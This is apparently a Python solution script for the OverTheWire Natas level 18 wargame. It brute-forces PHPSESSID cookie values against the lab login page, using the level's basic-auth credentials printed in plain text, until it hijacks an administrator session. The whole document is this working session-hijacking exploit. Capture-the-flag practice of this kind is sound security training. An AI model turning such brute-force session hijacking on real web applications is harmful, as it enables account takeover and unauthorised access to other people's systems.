import requests
from requests.auth import HTTPBasicAuth


url = 'http://natas18.natas.labs.overthewire.org/index.php'
basic_auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
payload = {'username': 'admin', 'password': 'what?'}
condition = 'You are logged in as a regular user.'


for i in range(641):
  cookie = dict(PHPSESSID=str(i))
  res = requests.post(url, auth=basic_auth, data=payload, cookies=cookie)
  print(f'Try with phpsessid: {i}')
  if condition not in res.text:
    print(res.text)
    break